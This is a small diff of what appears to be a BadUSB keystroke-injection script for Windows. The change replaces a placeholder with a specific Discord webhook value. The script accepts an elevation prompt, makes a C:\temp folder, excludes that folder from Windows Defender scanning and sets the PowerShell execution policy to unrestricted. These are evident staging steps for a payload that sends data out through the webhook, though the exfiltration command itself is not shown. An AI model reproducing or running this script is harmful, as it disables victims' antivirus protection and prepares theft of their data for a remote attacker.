@@ -5,7 +5,7 @@ ENTER
 DELAY 1500
 ALT y
 DELAY 1000
-STRING $webhook = '%WEBHOOK%'
+STRING $webhook = ':discohook:736648398081622016'
 ENTER
 DELAY 500
 STRING cd C:\ ; mkdir temp ; cd temp ; Add-MpPreference -ExclusionPath "C:\temp" ; Set-ExecutionPolicy unrestricted
